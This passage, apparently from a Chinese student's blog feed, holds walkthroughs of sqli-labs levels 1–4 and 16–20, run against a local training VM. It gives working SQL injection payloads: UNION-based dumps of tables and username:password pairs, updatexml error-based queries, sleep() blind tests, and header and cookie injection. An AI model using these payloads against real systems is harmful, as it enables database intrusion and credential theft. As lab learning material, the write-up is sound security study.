class="line">uname=admin&#x27; and if(left((<span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="keyword">id</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">4</span>)=<span class="string">&#x27;dumb&#x27;</span> ,<span class="keyword">sleep</span>(<span class="number">5</span>),<span class="number">1</span>)<span class="comment">--+&amp;passwd=admin&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><h2 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h2><p>又是没有回显，所以时间型盲注，要做的就是判断闭合符号。其他的都与上一关一样。<br><img src="https://img-blog.csdnimg.cn/20200430231029551.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><p>判断完毕，是<code>&quot;)</code>闭合。<br>其他不再重复。</p><h2 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h2><p>好像是没见过的，emmmmm，然后看了眼标题，(基于错误的更新查询POST注入)，报错注入。反斜扛也没有回显。我试了盲注<br><img src="https://img-blog.csdnimg.cn/20200430231236411.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><p>好像没有思路了。<br>这一关还是跟着大佬的博客来学习吧。<br>看下源码，然而，就能看懂几句。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params">$value</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($value))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// truncation (see comments)</span></span><br><span class="line">$value = substr($value,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line"><span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">&#123;</span><br><span class="line">$value = stripslashes($value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Quote if not a number</span></span><br><span class="line"><span class="keyword">if</span> (!ctype_digit($value))</span><br><span class="line">&#123;</span><br><span class="line">$value = <span class="string">&quot;&#x27;&quot;</span> . mysql_real_escape_string($value) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$value = intval($value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个看了大佬的博客</p><blockquote><p>只截取15个字符<br>get_magic_quotes_gpc()<br>当magic_quotes_gpc=On的时候，函数get_magic_quotes_gpc()就会返回1<br>当magic_quotes_gpc=Off的时候，函数get_magic_quotes_gpc()就会返回0<br>magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有：post、get、cookie过来的数据增加转义字符“\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误。<br>在magic_quotes_gpc = On的情况下，如果输入的数据有<br>单引号（’）、双引号（”）、反斜线（\）与 NULL（NULL 字符）等字符都会被加上反斜线。<br>stripslashes()删除由 addslashes() 函数添加的反斜杠<br>ctype_digit()判断是不是数字，是数字就返回true，否则返回false<br>mysql_real_escape_string()转义 SQL 语句中使用的字符串中的特殊字符。<br>intval()     整型转换</p></blockquote><p>不好意思抄，还是把大佬的博客放这里——&gt;<a href="https://blog.csdn.net/qq_41420747/article/details/81836327#Less-17%20POST%20-%20Update%20Query-%20Error%20Based%20-%20String%20%28%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84%E6%9B%B4%E6%96%B0%E6%9F%A5%E8%AF%A2POST%E6%B3%A8%E5%85%A5%29">关于Less-17关</a><br>这个是对uname进行了一大堆过滤，反而password没有做什么措施所以可以从第二个框里入手插SQL语句。<br>试一下，是对的。<br><img src="https://img-blog.csdnimg.cn/20200430231516225.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><p>但是他这个要考验的内容是什么？？我感觉应该是多方面考虑，不要将思维固化，尝试换个角度思考问题可能会有意想不到的结果。<br>其他的不再重复。</p><h2 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h2><p><img src="https://img-blog.csdnimg.cn/20200430231559611.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><p>一上来给我个IP什么意思？靶场是搭建在虚拟机上的。看一下那个标题。<br>(header injection Uagent)<br>一看这个我就明白了，哈。我之前看过这个，前几天看过两个关于注入的注入点比较不平常的，没想到在靶场会有。哈，正好练练手。我这个还记笔记了，在印象笔记上，先搬过来再说</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HTTP中User-Agent注入</span><br><span class="line"><span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO&#x27;security&#x27;.&#x27;uagents&#x27;(&#x27;uagent&#x27;,&#x27;ip_address&#x27;,&#x27;username&#x27;) VALUES (&#x27;<span class="variable">$uagent</span>&#x27;,&#x27;<span class="variable">$IP</span>&#x27;,<span class="variable">$uname</span>)&quot;</span>;</span><br><span class="line">payload内容</span><br><span class="line">updatexml(xml_document,xpath_string,new_value);</span><br><span class="line">第一个参数：XML文档对象名称。//可以用数字代替</span><br><span class="line">第二个参数：XPath字符串。</span><br><span class="line">第三个参数：替换查找到的符合条件的数据。</span><br><span class="line"><span class="string">&#x27; and updatexml(1,concat(0x7e,(select @@version),0x7e),1) or &#x27;</span>1<span class="string">&#x27;=&#x27;</span>1      //查询当前版本信息</span><br><span class="line"><span class="string">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) or &#x27;</span>1<span class="string">&#x27;=&#x27;</span>1   //查询当前数据库名。其他以此类推。</span><br></pre></td></tr></table></figure><p>因为这个唯一跟之前不同的就是它的注入点变了，语句什么的还是老样子。先抓包看一下。，抓到了，要插入SQL语句就在这个地方插入就可以。<br><img src="https://img-blog.csdnimg.cn/20200430231756796.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><p>先看看当前版本信息</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and updatexml(1,concat(0x7e,(<span class="keyword">select</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="keyword">or</span> <span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200430231917788.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><p>版本信息出来了，这个时候就证明是可行的，所以直接构造得出数据库名的payload就可以了。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and updatexml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="keyword">or</span> <span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200430232021967.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><p>下面就很正常了，按照报错注入的程序来走就行了。不再重复。</p><h2 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h2><p>我看了标题，emmmm，是在Referer处进行注入，</p><blockquote><p>HTTP Referer注入<br>‘ or ‘1’=’1      //查询是否存在注入<br>‘ or (length(database()))&gt;8 or if(1=1,sleep(5),null) or ‘1’=’1    //通过一个一个查询信息得到我们想要的结果。过程繁杂。</p></blockquote><p>emmm这个也是我的笔记，我的笔记当时记录的时候是以一个基于盲注的注入例题来记录的，当然这里有回显，就不是盲注。反而变得简单了点。<br>可以看出这个是在Referer处插入语句，但是比较复杂。<br>看一下，当然是先抓包，<br><img src="https://img-blog.csdnimg.cn/20200430232159587.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><p>在这里插入SQL语句<br>先判断是否存在注入，<code>&#39; or &#39;1&#39;=&#39;1</code><br>有点多余哈，(在这里)，不过在实战中还是需要这一步。<br>然后可以构造查询语句来得到我们想要的结果。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and updatexml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="keyword">or</span> <span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200430232253508.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><p>没有什么其他的新的知识点，不再重复。</p><h2 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h2><p>先试一下，还是老样子，全输入admin，然后看。<br>我透？这啥鬼东西，cookie都整出来了。<br><img src="https://img-blog.csdnimg.cn/20200430232355966.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><p>不过，想想前两关的套路，这个难道是在cookie处进行注入吗？<br>试试。我透！！为啥跟刚才不一样了，同样是输入的admin啊，再说了，这在哪插？？(我tm直接懵逼.jpg)<br><img src="https://img-blog.csdnimg.cn/20200430232500979.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><p>再想想，我刚好想进行了一个不为人知的操作，就是下面这个<br><img src="https://img-blog.csdnimg.cn/20200430232602379.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><p>我明白了，他会变样是因为我把cookie删了，然后浏览器就没有完成一系列的流程，所以在burp里显示不出来，这次我不删了，直接刷新，<br><img src="https://img-blog.csdnimg.cn/20200430232652358.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><p>嘿嘿，找到了，在这里注入就好啦，<br>这个详细记录一下：</p><h3 id="普通方法"><a href="#普通方法" class="headerlink" title="普通方法"></a>普通方法</h3><p>先判断闭合符号，加个单引号试试，发现有报错，那就是单引号闭合了。<br><img src="https://img-blog.csdnimg.cn/20200430232804497.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><p>判断列数payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27; order by 1 <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200430232901328.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><p>然后到4就回显错误了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27; order by 4 <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200430232945586.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><p>然后爆数据库payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=-admin&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">database</span>()<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200430233041203.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><p>联合查询的特点不能忘了，要将前面的<code>uname=-admin</code>，这个要构造成错的。然后继续的话，跟第一关一样了，没什么要注意的了。</p><h3 id="第二种方法：报错注入"><a href="#第二种方法：报错注入" class="headerlink" title="第二种方法：报错注入"></a>第二种方法：报错注入</h3><p>已知单引号闭合，所以直接使用报错注入常用函数进行查询数据库名<br>查询数据库名构造payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27; and updatexml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200430233121588.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><p>都是一个样子，做了这二十关的题，收获很多，不过毕竟手注太费劲了，费时费力，要学使用工具了，python脚本不会写，可以使用工具，sqlmap是个不错的选择，就搞它。下次再学习SQL注入就要进行sqlmap的学习了，前段时间多少了解了一点，现在只会用sqlmap进行第一关的爆破，其他的注入也见过，知道方法但是没有实践，还是回头再细学一下再说吧。</p><p>文末寄语：<br>这世上多一个人笑，就少一个人哭。——《煎饼侠》</p>]]></content>
      
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs闯关1-4</title>
      <link href="/2020/08/23/sqli-lab%E9%97%AF%E5%85%B31%E2%80%944/"/>
      <url>/2020/08/23/sqli-lab%E9%97%AF%E5%85%B31%E2%80%944/</url>
      
        <content type="html"><![CDATA[<h4 id="The-first"><a href="#The-first" class="headerlink" title="The first"></a>The first</h4><p>第一步：判断闭合符号，输入单引号，看看是否报错，这里就报错了，当然注释符有好多种（<code>&#39;</code>、<code>&quot;</code>、<code>#</code>、<code>--+</code>）这里输入单引号就行了，报错了。<br>根据报错信息，可以确定输入参数的内容被存放到一对单引号中间。这里我很迷，到了第二关，也是报错，先不说，就是有没有人懵逼这个报错怎么看是不是需要单引号？？是什么类型的注入？？？和我一样的新手看到这里不懂请自动忽略，等到第二关再回来看，就会明白了，这个依据就是：你仔细看第一关和第二关的第一步报错对比一下，认真看，看看是不是第一张图片那个LIMIT前面那个1两边是有双引号的，第二张图就没有。仔细品😎😎😎<br>输入：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020022722143253.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>第二步：判断列数用order by语句<br>输入：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; order by 1--+</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200227223713890.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>然后把1换成2，再换成3，判断下去，直到报错为止。依次判断，这里是到4，报错。<br><img src="https://img-blog.csdnimg.cn/20200227224012265.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>（附图作参考，如果没有出现这个页面，那么就是SQL语句输入错误，检查语句。）<br>第三步：联合注入爆数据库令 <strong>id=非正确值</strong>,这里我使id=0。<br>至于为什么？哪有呢么多为什么、我也不知道，hhh🤣🤣🤣</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; union select 1,2,database()--+</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200227225857611.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>这里，database()放在2或者3的位置都可以，注意，如果放在2的位置上的话，后面的3不能丢，这个错误很容易犯，所以，我就放在3的位置上，这样也不会忘。😂😂<br>第四步：爆数据表</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200227230738159.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>显然users是用户数据表，为什么？单词告诉我的，那三个像吗？就算猜也要给我猜这个！😎😎😎<br>第五步：爆字段</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; --+</span><br></pre></td></tr></table></figure><p>看到了，那么大的username，password😁😁<img src="https://img-blog.csdnimg.cn/20200227231443749.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>最最最后一步了，爆值：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; union select 1,2,group_concat(username,0x3a,password) from users--+</span><br></pre></td></tr></table></figure><p>0x3a意思是“<code>:</code>”<br><img src="https://img-blog.csdnimg.cn/20200227232220458.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>这都是哈哈哈，恭喜通关！✌✌✌✌</p><h4 id="The-second"><a href="#The-second" class="headerlink" title="The second"></a>The second</h4><p>第一步：还是先判断有无闭合符号，然后输入<code>?id=1&#39;</code><br><img src="https://img-blog.csdnimg.cn/20200227233231504.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>根据报错信息确定输入的内容被带入到数据库中，也可叫做数字型注入。懵逼了没，为什么？怎么看出来的？跟第一关有什么不同？再回过头去看看文章开头第一关那里能不能看出来就靠自己了，反正我是看懂了，hhh<br>跟第一关的步骤一样，只是，不再需要这个<code>&#39;</code>单引号了。<br>就不再重复了，我把结果放出来吧，证明是可行的。😜😜😜<br><img src="https://img-blog.csdnimg.cn/20200228000749246.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><h4 id="The-third"><a href="#The-third" class="headerlink" title="The third"></a>The third</h4><p>第三关和前面一样，只是闭合符号又不一样这次的是,,,,看圆括号<br><img src="https://img-blog.csdnimg.cn/2020022800200438.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>好了，其他还是跟上面一样，不说了，太困了，啊啊！睡觉，，今天又熬夜了，心疼我的头发，害！！对了，留一张图，证明我来过。。。。。<br><img src="https://img-blog.csdnimg.cn/20200228002342974.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>晚安，来不及回首说拜拜。</p><html ><hr> </html><p>上面是一条华丽的分界线,进行下一关</p><h4 id="The-fourth"><a href="#The-fourth" class="headerlink" title="The fourth"></a>The fourth</h4><p>第一步仍然是判断闭合符号，先判断单引号<br><img src="https://img-blog.csdnimg.cn/20200229164259624.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>没有报错。那就不是，再试双引号<br><img src="https://img-blog.csdnimg.cn/20200229164502713.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" loading="lazy"><br>报错，根据报错信息判断出输入的内容被放到一对双引号和圆括号中啦。<br>接下来就该判断列数，</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot;) order by 1--+</span><br></pre></td></tr></table></figure><p>还是到4报错了，<br><img src="https://img-blog.csdnimg.cn/20200229165132883.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>到这里，不判断他的数据库名来试试，直接爆表名，（我看其他博主的博客有这么做的，我也来试试，省去爆库的步骤了）</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&quot;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200229171425981.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>哇！真的可以。<br><img src="https://img-blog.csdnimg.cn/20200229165641717.gif" alt="在这里插入图片描述" loading="lazy"><br>解释一下哈，刚没有爆库名，所以我不知道在哪个库里面，然后，我把语句改成这样啦<code>where table_schema=database()</code>就是从table_schema=database(),这个库里直接爆表，也是可以的。目前刚了解到，还是先老老实实的爆先爆库名。<br>继续继续hhh，爆列：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&quot;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; --+</span><br></pre></td></tr></table></figure><p>跟前几关一样了<br><img src="https://img-blog.csdnimg.cn/20200229171926158.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>最后爆值，</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&quot;) union select 1,group_concat(username,0x3a,password),3 from users--+</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200229172655963.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy">OK，收工~<br>学习感受：感觉emmmmmm, 非常有趣，说实话，我是个笨蛋，没别人记得快，我做了好多遍才记住这个步骤的，做的时候呢……忘这忘那的，很粗心，做不好又非常着急，特别容易紧张，脑子就不知道怎么想了。不过我并不比别人差，说不定他们也是练得比较多，付出的努力更多呢。而且我对这个很感兴趣，都说兴趣是最好的老师，付出肯定会得到回报，给自己喊句奥利给！！！</p>]]></content>
      
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs闯关续</title>
      <link href="/2020/08/23/sqli-labs%E9%97%AF%E5%85%B3%E7%BB%AD/"/>
      <url>/2020/08/23/sqli-labs%E9%97%AF%E5%85%B3%E7%BB%AD/</url>
      
